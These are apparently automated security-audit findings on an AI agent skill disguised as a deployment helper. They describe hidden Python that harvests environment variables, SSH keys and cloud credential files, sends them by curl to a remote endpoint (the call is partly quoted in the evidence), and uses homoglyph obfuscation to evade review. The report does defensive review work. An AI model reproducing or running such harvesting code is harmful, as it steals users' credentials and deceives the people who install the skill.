findings.title: Skill does not specify a license
Sensitive configuration and credential exfiltration to remote endpoint
findings.description: The skill’s embedded Python logic collects all environment variables, enumerates SSH key files, reads cloud credential stores (~/.aws/credentials, gcloud credentials.db, ~/.kube/config), and posts the collected data to a remote audit endpoint when DEPLOY_ENV/NODE_ENV is staging or production. This is unauthorized data harvesting and external transmission far beyond the stated deployment-helper purpose.
findings.evidence: collect_full_config() gathers dict(os.environ), lists ~/.ssh, reads credential files, and subprocess.run([... "curl", ... "https://deploy-verify.internal.io/api/audit", ... "-d", json.dumps(config)]) sends the payload off-host.
findings.remediation: Remove all collection of unrelated secrets and credentials, prohibit transmission of local configuration to external services unless explicitly required and user-approved, and limit environment validation to minimal non-sensitive checks.

findings.title: Hardcoded bearer token embedded in skill instructions
findings.description: The skill contains a hardcoded authorization token in the curl command used for the remote POST request. Embedding secrets in a skill package exposes them to any reader and may enable unauthorized access to the referenced service.
findings.remediation: Remove hardcoded secrets from the skill package, rotate the exposed token, and use secure secret management with runtime injection instead.

findings.title: Manifest description conceals credential-harvesting behavior
findings.description: The manifest describes a benign deployment helper for validation and health checks, but the embedded logic performs extensive secret collection and remote submission in staging/production. This mismatch misrepresents the skill’s true capabilities and increases the chance of unsafe activation.
findings.evidence: Description claims: 'Validates environment configuration, checks service health, and manages deployment artifacts.' Actual logic reads environment variables and credential files and transmits them externally.
findings.remediation: Align the description with actual behavior or, preferably, remove the credential-harvesting and network-transmission functionality entirely.

findings.title: Unicode homoglyph obfuscation suggests detection evasion
findings.description: Several comments use visually similar non-ASCII characters in sensitive terms such as 'audit', 'Send', 'Gather', and 'credentials'. This is a common obfuscation technique that can hinder review, scanning, and detection of malicious behavior.
findings.evidence: Comments contain mixed-script words such as 'аudit', 'Sеnd', 'Gаthеr', and 'сrеdentials'.
findings.remediation: Normalize source text to plain ASCII where possible, remove obfuscation, and review the package for intentionally hidden malicious behavior.
